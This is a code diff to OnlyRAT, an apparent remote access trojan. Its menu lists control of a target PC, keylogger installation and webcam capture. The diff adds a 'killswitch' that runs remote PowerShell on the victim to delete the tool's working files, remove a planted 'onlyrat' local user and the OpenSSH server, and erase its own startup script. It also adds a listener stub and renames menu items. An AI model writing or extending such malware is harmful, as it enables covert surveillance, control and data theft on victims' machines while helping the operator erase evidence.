@@ -45,6 +45,7 @@ options_menu = """
             [downlaod] ------- Download File
             [restart] -------- Restart Target PC
             [shutdown] ------- Shutdown Target PC
+            [killswitch] ----- Removes OnlyRAT From Target
 
         [+] Reconnaissance:
             [install keylogger] ------ Install Keylogger
@@ -60,7 +61,7 @@ options_menu = """
             [config] --- Display RAT File
             [version] -- Version Number
             [update] --- Update OnlyRAT
-            [remove] --- Remove OnlyRAT
+            [uninstall] --- Uninstall OnlyRAT
             [quit] ----- Quit
 
             * any other commands will be 
@@ -227,6 +228,17 @@ def grab_webcam(address, password, working, username):
     # confirmation
     print("\n[+] Photos downloaded to \"~/Downloads\"\n")
 
+# killswitch
+def killswitch(address, password, working, username):
+    print("\n[*] Formatting killswitch...")
+    delete_working = f"powershell Remove-Item {working}/*"
+    delete_startup = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Remove-Item $env:temp/*; Remove-LocalUser -Name \"onlyrat\"; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item GiLqXiexKP.cmd; >> GiLqXiexKP.cmd"
+    print("[+] Killswitch formatted")
+
+    print("[*] Removing working directory...")
+    remote_command(address, password, delete_working)
+    remote_command(address, password, delete_startup)
+    print("[+] Working directory removed")
 
 # custom upload
 def upload(address, password, working):
@@ -269,7 +281,7 @@ def update():
     # if new version is available, update
     if latest_version > current_version:
         print("\n[+] Update found")
-        print("[*] Update Onlyrat? [y/n]\n")
+        print("[~] Update Onlyrat? [y/n]\n")
 
         # user input, option
         option = input(f"{header}")
@@ -292,7 +304,7 @@ def update():
 # uninstalls onlyrat
 def remove():
     # confirmation
-    print("\n [!] Are you sure you want to remove OnlyRAT [y/n]\n")
+    print("\n[~] Are you sure you want to remove OnlyRAT [y/n]\n")
 
     # user input
     option = input(header)
@@ -305,10 +317,19 @@ def remove():
     if option == "n":
         main()
 
+# listener
+def listener():
+    pass
+
 # command line interface
 def cli(arguments):
     # display banner
     clear()
+
+    # listener
+    if sys.argv[1] == "listener":
+        listener()
+
     print(banner)
 
     # if arguments exist
@@ -423,6 +444,15 @@ def cli(arguments):
             elif option == "update":
                 update()
                 exit()
+
+            # kill switch
+            elif option == "killswitch":
+                print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
+                confirm = input(header)
+                if confirm == "y":
+                    killswitch(ipv4, password, working_direcory, target_username)
+                else:
+                    main()
 
             # onlyrat manual
             elif option == "man" or option == "manual":
